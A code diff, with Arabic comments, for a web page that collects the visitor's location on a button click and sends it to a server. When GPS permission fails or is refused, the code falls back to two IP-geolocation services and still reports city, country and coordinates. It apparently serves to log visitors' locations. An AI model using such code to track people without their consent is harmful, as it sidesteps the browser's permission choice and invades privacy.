@@ -46,7 +46,8 @@
       }
     }
 
-    document.getElementById('getLocationBtn').addEventListener('click', () => {
+    document.getElementById('getLocationBtn').addEventListener('click', async () => {
+      // خطوة 1: GPS
       if ('geolocation' in navigator) {
         navigator.geolocation.getCurrentPosition(pos => {
           const { latitude, longitude } = pos.coords;
@@ -54,15 +55,22 @@
           const message = `📍 موقع جديد:\nخط العرض: ${latitude}\nخط الطول: ${longitude}\nرابط الخريطة: ${googleMapsLink}`;
           sendToServer(message);
         }, async () => {
-          // fallback عبر IP
+          // خطوة 2: GBRS مجاني
           try {
-            const res = await fetch('https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN');
+            const res = await fetch('https://geolocation-db.com/json/');
             const data = await res.json();
-            const loc = data.loc ? data.loc.split(',') : ['غير متاح','غير متاح'];
-            const message = `📍 موقع تقريبي عبر IP:\nمدينة: ${data.city}\nدولة: ${data.country}\nخط العرض: ${loc[0]}\nخط الطول: ${loc[1]}`;
+            const message = `📍 موقع عبر GBRS:\nمدينة: ${data.city}\nدولة: ${data.country_name}\nخط العرض: ${data.latitude}\nخط الطول: ${data.longitude}`;
             sendToServer(message);
           } catch {
-            alert('تعذر الحصول على الموقع عبر GPS أو IP.');
+            // خطوة 3: IP fallback
+            try {
+              const res2 = await fetch('https://ipapi.co/json/');
+              const data2 = await res2.json();
+              const message2 = `📍 موقع تقريبي عبر IP:\nمدينة: ${data2.city}\nدولة: ${data2.country_name}\nخط العرض: ${data2.latitude}\nخط الطول: ${data2.longitude}`;
+              sendToServer(message2);
+            } catch {
+              alert('تعذر الحصول على الموقع عبر GPS أو GBRS أو IP.');
+            }
           }
         });
       } else {
